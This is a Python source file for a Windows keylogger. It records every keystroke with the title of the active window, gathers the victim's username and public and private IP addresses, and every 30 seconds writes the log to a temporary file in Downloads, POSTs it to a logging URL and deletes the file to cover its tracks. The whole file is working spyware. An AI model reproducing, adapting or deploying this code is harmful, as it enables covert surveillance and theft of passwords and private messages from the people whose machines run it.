from pynput.keyboard import Key,Listener
import win32gui
import os
import time
import requests
import socket
import random
import smtplib
import threading

url = "http://127.0.0.1:5000/log"

datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []


def on_press(key):
	global old_app

	new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

	if new_app == 'Cortana':
		new_app = 'Windows Start Menu'
	else:
		pass
	
	
	if new_app != old_app and new_app != '':
		logged_data.append(f'[{datetime}] ~ {new_app}\n')
		old_app = new_app
	else:
		pass


	substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

	key = str(key).strip('\'')
	if key in substitution:
		logged_data.append(substitution[substitution.index(key)+1])
	else:
		logged_data.append(key)


def write_file(count):
	one = os.path.expanduser('~') + '/Downloads/'
	#three = 'C:/'

	filepath = one
	filename = str(count) + 'I' + str(random.randint(1000000,9999999)) + '.txt'
	file = filepath + filename
	delete_file.append(file)


	with open(file,'w') as fp:
		fp.write(''.join(logged_data))


def send_logs():
	count = 0
	while True:
		time.sleep(30)
		if len(logged_data) > 1:
			try:
				write_file(count)
				
				subject = f'[{user}] ~ {count}'
				
				attachment = open(delete_file[0], 'rb')
				
				filename = delete_file[0].split('/')[2]
				
				r = requests.post(url, data=attachment.read())
				print(r)
				attachment.close()
				
				os.remove(delete_file[0])
				del logged_data[1:]
				del delete_file[0:]
				
				count+=1
				
			except Exception as errorString:
				continue

if __name__=='__main__':
	T1 = threading.Thread(target=send_logs)
	T1.start()

	with Listener(on_press=on_press) as listener:
		listener.join()

